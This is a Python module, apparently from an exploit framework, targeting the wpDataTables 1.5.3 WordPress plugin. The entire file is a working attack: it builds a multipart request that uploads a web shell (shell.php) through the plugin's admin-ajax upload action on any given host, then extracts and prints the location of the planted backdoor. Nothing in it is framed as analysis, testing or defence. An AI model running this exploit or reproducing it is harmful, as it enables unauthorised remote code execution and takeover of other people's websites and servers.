import re
import urllib.request
from ..exploitshell import ExploitShell


class WPDataTables(ExploitShell):
	@staticmethod
	def getname():
		return "wpDataTables"

	@staticmethod
	def getversion():
		return '1.5.3'

	@staticmethod
	def getexploit():
		payloadname = 'extras/shell.php'
		payloadcontent = open(payloadname).read()

		limit = '----------lImIt_of_THE_fIle_eW_$'
		crlf = '\r\n'

		body = []

		body.append('--' + limit)
		body.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
		body.append('Content-Type: application/force-download')
		body.append('')
		body.append(payloadcontent)
		body.append('--' + limit + '--')
		body.append('')

		return crlf.join(body).encode('utf-8')

	@classmethod
	def exploit(cls, hostname):
		if hostname[:8] != "https://" and hostname[:7] != "http://":
			hostname = 'http://' + hostname

		url = hostname + '/wp-admin/admin-ajax.php?action=wdt_upload_file'

		content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

		body = cls.getexploit()

		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
			'Chrome/36.0.1985.125 Safari/537.36',
			'content-type': content_type,
			'content-length': str(len(body))}

		req = urllib.request.Request(url, body, headers)
		response = urllib.request.urlopen(req)
		read = response.read().decode("iso-8859-1")

		if "error" in read or read == '0':
			return False
		else:
			backdoor_location = re.compile('\"url\":\"(.*?)\",\"').search(read).group(1)
			return "[!] Shell Uploaded \r\n [!] Location: " + backdoor_location.replace("\\", "")

